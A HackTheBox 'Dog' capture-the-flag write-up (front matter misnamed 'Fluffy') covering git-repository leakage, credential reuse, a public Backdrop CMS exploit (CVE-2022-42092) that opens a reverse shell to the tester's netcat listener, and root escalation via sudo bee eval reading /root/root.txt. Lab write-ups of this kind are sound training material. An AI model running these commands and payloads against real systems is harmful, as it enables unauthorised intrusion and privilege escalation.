---
title: "Dog"
date: 2026-02-14
draft: false

type: "hackthebox"
layout: "single"

tags: ["HackTheBox", "Active Directory", "SMB", "NTLM", "Privilege Escalation"]
categories: ["HackTheBox"]

image: "preview.png"
description: "HackTheBox Fluffy machine writeup"
---


# Dog

![Dog.png](Dog.png)

target ip = `10.10.11.58`

## Pinging

```bash
┌──(kali㉿kali)-[~]
└─$ ping 10.10.11.58 
PING 10.10.11.58 (10.10.11.58) 56(84) bytes of data.
64 bytes from 10.10.11.58: icmp_seq=1 ttl=63 time=268 ms
64 bytes from 10.10.11.58: icmp_seq=2 ttl=63 time=163 ms
^C
--- 10.10.11.58 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1054ms
rtt min/avg/max/mdev = 163.328/215.442/267.556/52.114 ms
```

## Nmap Scanning

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.11.58
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 06:24 EDT
Nmap scan report for 10.10.11.58
Host is up (3.5s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.06 seconds
                                                                
```

open ports are `80` and `22`  and also it’s  `10.10.11.58:80/.git/`  is open as well.

## Task#01

**How many open TCP ports are listening on Dog?**

Answer : `2` 

## Task#02

**What is the name of the directory on the root of the webserver that leaks the full source code of the application?**

Answer : `.git` 

## `Port 80`

```bash
┌──(kali㉿kali)-[~]
└─$ firefox 10.10.11.58:80
```

![image.png](image.png)

it leads to a website about `DOGS` 

## Task#03

**What is the CMS used to make the website on Dog? Include a space between two words.**

Answer : `Backdrop CMS`

## GitDmper:

### Installation

First I activated my python virtual enviroment

```bash
┌──(kali㉿kali)-[~]
└─$ source work/bin/activate 
```

Then installed the library for `git-dumper`

```bash
(work)─(kali㉿kali)-[~]
└─$ pipx install git-dumper
  installed package git-dumper 1.0.8, installed using Python 3.13.3
  These apps are now globally available
    - git-dumper
done! ✨ 🌟 ✨
```

After the successful installation I check for the correct syntax using the help flag `-h` 

```bash
┌──(work)─(kali㉿kali)-[~]
└─$ git-dumper -h                                           
usage: git-dumper [options] URL DIR

Dump a git repository from a website.

positional arguments:
  URL                   url
  DIR                   output directory

options:
  -h, --help            show this help message and exit
  --proxy PROXY         use the specified proxy
  --client-cert-p12 CLIENT_CERT_P12
                        client certificate in PKCS#12
  --client-cert-p12-password CLIENT_CERT_P12_PASSWORD
                        password for the client certificate
  -j, --jobs JOBS       number of simultaneous requests
  -r, --retry RETRY     number of request attempts before giving up
  -t, --timeout TIMEOUT
                        maximum time in seconds before giving up
  -u, --user-agent USER_AGENT
                        user-agent to use for requests
  -H, --header HEADER   additional http headers, e.g `NAME=VALUE`
```

The command used for dumping the repository

```bash
┌──(work)─(kali㉿kali)-[~]
└─$ git-dumper http://10.10.11.58/.git/ /home/kali/dog_dumper
```

## Task#04

**What is the password the application uses to connect to the database?**

Answer : 

```bash
(kali㉿kali)-[~/fixed_dog]
└─$ ls 
core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes

┌──(kali㉿kali)-[~/fixed_dog]
└─$ cat ./settings.php | grep -A 10 '\$database' 
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

/**
 * Site configuration files location.
 *
 * By default these directories are stored within the files directory with a
 * hashed path. For the best security, these directories should be in a location
 * that is not publicly accessible through a web browser.
 *
 * Example using directories one parent level up:
 * @code
--
$database_charset = 'utf8mb4';

```

password = `BackDropJ2024DS2024`

## Task#05

**What user uses the DB password to log into the admin functionality of Backdrop CMS?What user uses the DB password to log into the admin functionality of Backdrop CMS?**

I looked in the git repository using the command:

`grep -IR dog.htb .`

- `I`: Ignore binary files
- `R`: Recursive
- `.`: Search current directory

```bash
┌──(kali㉿kali)-[~/GitTools/Dumper]
└─$ cd ../../fixed_dog 
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ ls
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ ls -a                      
.  ..  .git
                                                                                                                                                                                                                                                                         
┌──(kali㉿kali)-[~/fixed_dog]
└─$ git checkout .

Updated 2873 paths from the index
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ ls
core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ git init       
Reinitialized existing Git repository in /home/kali/fixed_dog/.git/
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ git checkout -f
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ ls
core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
                                                                                                                                       
┌──(kali㉿kali)-[~/fixed_dog]
└─$ git branch      
* master
                                                                                                                                    
┌──(kali㉿kali)-[~/fixed_dog]
└─$ grep -IR dog.htb .

./.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000	commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Answer : `tiffany`

using the Credentials obtained i got in the website 

![image.png](image%201.png)

username = `tiffany`

password = `BackDropJ2024DS2024` 

## Task#06

**What system user is the Backdrop CMS instance running as on Dog?**

i looked for the `backdrop cms` and searched for its exploits.

![image.png](image%202.png)

I discovered that it has file inclusion vulnerability

![image.png](image%203.png)

[CVE-2022-42092 (2)](https://www.notion.so/CVE-2022-42092-2-27b5bb87e26980e5af96e79d834f0531?pvs=21)

### Exploit:

Found an public exploit on github.

![image.png](image%204.png)

[https://github.com/ajdumanhug/CVE-2022-42092](https://github.com/ajdumanhug/CVE-2022-42092)

```bash
                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ source work/bin/activate
                                                                                                                                       
┌──(work)─(kali㉿kali)-[~]
└─$ git clone https://github.com/ajdumanhug/CVE-2022-42092  
Cloning into 'CVE-2022-42092'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 6.38 KiB | 1.60 MiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                       
┌──(work)─(kali㉿kali)-[~]
└─$ ls
CVE-2022-42092  Documents  fixed_dog  lab_B3taBlocker.ovpn  Pictures  Templates  work
Desktop         Downloads  GitTools   Music                 Public    Videos
                                                                                                                                      
```

### Usage

```bash
python3 CVE-2022-42902.py <target_url> <username> <password> <listener_ip> <listener_port>
```

Important: Start your listener before running the script:

```bash
nc -lvnp <listener_port>
```

For exploiting:

```bash
┌──(work)─(kali㉿kali)-[~/CVE-2022-42092]
└─$ python3 CVE-2022-42092.py  http://dog.htb tiffany BackDropJ2024DS2024 10.10.16.36 1234
[+] Retrieving form_build_id...
[+] Logging in...
[+] Login successful!
[+] Creating malicious shell module...
[+] Malicious shell module archive created.
[+] Grabbing admin installer tokens...
[+] Uploading malicious archive...
[+] File uploaded successfully!
[+] Sending Authorize Request ...
[+] Request successful!
[+] Triggering the reverse shell...
```

For Listening :

```bash
┌──(kali㉿kali)-[~/CVE-2022-42092]
└─$ nc -lvnp 1234
```

Got the shell 

![image.png](image%205.png)

Answer : `www-data`

```bash
www-data@dog:/var/www/html/modules$ whoami
whoami
www-data
www-data@dog:/var/www/html/modules$ 
```

## Task#07

**What system user on Dog shares the same DB password?**

Answer : `johncusack`

```bash
www-data@dog:/etc$ cut -d: -f1 /etc/passwd
cut -d: -f1 /etc/passwd
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
landscape
pollinate
fwupd-refresh
usbmux
sshd
systemd-coredump
jobert
lxd
mysql
johncusack
_laurel
www-data@dog:/etc$ 
```

### Switch user

```bash
www-data@dog:/etc$ su johncusack
su johncusack
Password: BackDropJ2024DS2024
```

```bash
var
cd
ls
script.php
user.txt
cat user.txt
ab84619a78b6ba0e076fe994b64b5a10
```

# User Flag :

`ab84619a78b6ba0e076fe994b64b5a10`

## Task#09

**What is the full path of the binary that the johncusack user can run as any user on Dog?**

```bash
data@dog:/var/www/html/modules/shell$ su johncusack
su johncusack
Password: BackDropJ2024DS2024
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
whoami
johncusack
```

```bash
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
```

I am **having a** `reverse shell` and `sudo` wants a **real terminal** to prompt for password input.

### Get a Proper Interactive Shell (PTY)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory

sh: 0: getcwd() failed: No such file or directory
johncusack@dog:/var/www/html/modules/shell$
```

Successfully got the terminal 

```bash
johncusack@dog:~$ sudo -l
sudo -l
[sudo] password for johncusack: BackDropJ2024DS2024

Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
johncusack@dog:~$ 

```

Answer : `/usr/local/bin/bee`

## Task#10

`bee` **requires a root directory to run properly. What is the appropriate root directory on Dog? Include the trailing** `/`**.**

```bash
johncusack@dog:/$ find / -type d -name 'modules' 2>/dev/null
/var/www/html/modules
/var/lib/php/modules

/usr/src/linux-headers-5.4.0-208-generic/include/config/modules

/usr/src/linux-headers-5.4.0-208/drivers/gpu/drm/amd/display/modules
/usr/lib/apache2/modules
/usr/lib/x86_64-linux-gnu/gio/modules
/usr/lib/modules
johncusack@dog:/$
```

Answer : `/var/www/html/`

- CMS like Backdrop, Drupal, etc., have `modules/`, `themes/`, `core/` under the **project root**.
- No other returned path fits that pattern or purpose (e.g., `/usr/lib/modules` is for Linux kernel modules — irrelevant to a web app).

## Task#11

**What is the** `bee` **subcommand to run arbitrary PHP code?**

![image.png](image%206.png)

Answer : `eval` 

# Root Flag

Technique used: **`privilege escalation via insecure sudo configuration and trusted developer tool**.`

```bash
johncusack@dog:/$ sudo /usr/local/bin/bee --root=/var/www/html/ eval "echo file_get_contents('/root/root.txt');"
<l/ eval "echo file_get_contents('/root/root.txt');"

2c8a6b0ef32cc156942c021b17c3a5bc
johncusack@dog:/$ 

```

root flag : **`2c8a6b0ef32cc156942c021b17c3a5bc`**